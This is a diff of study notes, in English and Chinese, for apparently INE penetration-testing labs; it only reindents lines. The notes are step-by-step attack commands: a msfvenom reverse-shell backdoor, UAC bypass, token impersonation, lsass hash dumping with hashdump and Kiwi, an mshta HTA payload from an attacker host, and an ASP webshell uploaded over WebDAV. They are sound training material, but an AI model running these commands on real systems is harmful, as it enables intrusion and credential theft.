@@ -149,18 +149,18 @@
 	meterpreter > getsystem
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	shell
-	net localgroup administrators
-	admin
-	Administrator
+		net localgroup administrators
+		admin
+		Administrator
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.38.3 LPORT=4444 -f exe > 'backdoor.exe'
 	file backdoor.exe
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	C:\Windows\system32>^C
 	meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
-	upload /root/Desktop/tools/UACME/Akagi64.exe .
-	upload /root/backdoor.exe .
-	ls
+		upload /root/Desktop/tools/UACME/Akagi64.exe .
+		upload /root/backdoor.exe .
+		ls
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
@@ -171,16 +171,16 @@
 		exploit
 
 	meterpreter > shell
-	cd  C:\Users\admin\AppData\Local\Temp
-	Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+		cd  C:\Users\admin\AppData\Local\Temp
+		Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > ps -S lsass.exe
 	 488  396   lsass.exe
-	meterpreter > migrate 488
-	meterpreter > hashdump
-	admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
-	Admin NTLM Hash :4d6583ed4cef81c2f2ac3c88fc5f3da6
+		meterpreter > migrate 488
+		meterpreter > hashdump
+		admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
+		Admin NTLM Hash :4d6583ed4cef81c2f2ac3c88fc5f3da6
 ## Privilege Escalation: Impersonate(冒充)
 	nmap -sV -p 80 demo.ine.local
 	searchsploit hfs
@@ -191,42 +191,42 @@
 		exploit 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > getuid 
-	=> Server username: NT AUTHORITY\LOCAL SERVICE
-	cat C:\\Users\\Administrator\\Desktop\\flag.txt (Access is denied)
+		=> Server username: NT AUTHORITY\LOCAL SERVICE
+		cat C:\\Users\\Administrator\\Desktop\\flag.txt (Access is denied)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	載入隱身外掛程式並檢查所有可用的令牌: 
-	load incognito
-	list_tokens -u
-	Delegation Tokens Available
-	========================================
-	ATTACKDEFENSE\Administrator
+		load incognito
+		list_tokens -u
+		Delegation Tokens Available
+		========================================
+		ATTACKDEFENSE\Administrator
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	impersonate_token ATTACKDEFENSE\\Administrator 
-	getuid
-	=> Server username: ATTACKDEFENSE\Administrator
-	cat C:\\Users\\Administrator\\Desktop\\flag.txt
+		getuid
+		=> Server username: ATTACKDEFENSE\Administrator
+		cat C:\\Users\\Administrator\\Desktop\\flag.txt
 # Windows Credential Dumping
 ## Unattended Installation
 	=> PowerUp.ps1
 	=> Source: https://github.com/PowerShellMafia/PowerSploit
 
 	PS > whoami
-	cd .\Desktop\PowerSploit\Privesc\
-	ls
+		cd .\Desktop\PowerSploit\Privesc\
+		ls
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	powershell -ep bypass (PowerShell execution policy bypass)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	. .\PowerUp.ps1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Invoke-PrivescAudit
-	UnattendPath : C:\Windows\Panther\Unattend.xml
-	Unattend.xml 是已安裝的應答檔。這些文件可能包含編碼或純文字憑證以及其他敏感資訊
+		UnattendPath : C:\Windows\Panther\Unattend.xml
+		Unattend.xml 是已安裝的應答檔。這些文件可能包含編碼或純文字憑證以及其他敏感資訊
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	cat C:\Windows\Panther\Unattend.xml
-	<Password>
-		            <Value>QWRtaW5AMTIz</Value>
-		            <PlainText>false</PlainText>
-	</Password>
+		<Password>
+			            <Value>QWRtaW5AMTIz</Value>
+			            <PlainText>false</PlainText>
+		</Password>
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	$password='QWRtaW5AMTIz'
 	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
@@ -238,21 +238,21 @@
 	C:\Windows\system32>whoami
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	kali : msfconsole -q
-	use exploit/windows/misc/hta_server
-	exploit
+		use exploit/windows/misc/hta_server
+		exploit
 
 	複製產生的有效負載 : 
 	[*] Using URL: http://10.10.43.2:8080/mX9qdH9fENH6w9.hta
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	啟用巨集的文件進行攻擊: 
-	cmd :mshta.exe http://10.10.43.2:8080/mX9qdH9fENH6w9.hta
+		cmd :mshta.exe http://10.10.43.2:8080/mX9qdH9fENH6w9.hta
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msf6 exploit(windows/misc/hta_server) > sessions -i 1
-	meterpreter > cd / 
-	shell
-	C:\>dir /s /b C:\flag*
-	type
-	cat C:\\Users\\Administrator\\Desktop\\flag.txt
+		meterpreter > cd / 
+		shell
+		C:\>dir /s /b C:\flag*
+		type
+		cat C:\\Users\\Administrator\\Desktop\\flag.txt
 ## Windows: Meterpreter: Kiwi Extension
 	=> Meterpreter Kiwi 外掛程式是 Metasploit 框架中的一種高級後利用工具
 
@@ -266,31 +266,31 @@
 		exploit
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將目前進程遷移到lsass.exe
-	migrate -N lsass.exe
+		migrate -N lsass.exe
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	載入 kiwi 擴充功能
-	load kiwi
+		load kiwi
 	擴充指令轉儲管理員 NTLM 雜湊值
-	creds_all
-	Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef
+		creds_all
+		Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef
 
 	管理員用戶 NTLM 雜湊： e3c61a68f1b89ee6c8ba9507378dc88d
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	提取所有使用者的 NTLM 雜湊值:
-	lsa_dump_sam
+		lsa_dump_sam
 
 	User : student
 	  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	轉儲 LSA 機密找到 syskey
-	lsa_dump_secrets
-	SysKey : 377af0de68bdc918d22c57a263d38326
+		lsa_dump_secrets
+		SysKey : 377af0de68bdc918d22c57a263d38326
 
 ## Host & Network Penetration Testing: System-Host Based Attacks CTF 1
 	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染。
 	=> 嘗試取得 root 或管理員權限來操縱或竊取敏感資料、安裝後門或導致系統崩潰
 	nmap -sC -sV target1.ine.local
-	80/tcp   open  http          Microsoft IIS httpd 10.0
+		80/tcp   open  http          Microsoft IIS httpd 10.0
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	password : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 	target1.ine.local
@@ -307,8 +307,8 @@
 		SUCCEED : html, shtml,txt,asp,aspx
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	cadaver http://target1.ine.local/webdav
-	put /usr/share/webshells/asp/webshell.asp
-	ls
+		put /usr/share/webshells/asp/webshell.asp
+		ls
 	http://target1.ine.local/webdav/webshell.asp
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	type C:\inetpub\wwwroot\webdav\flag1.txt
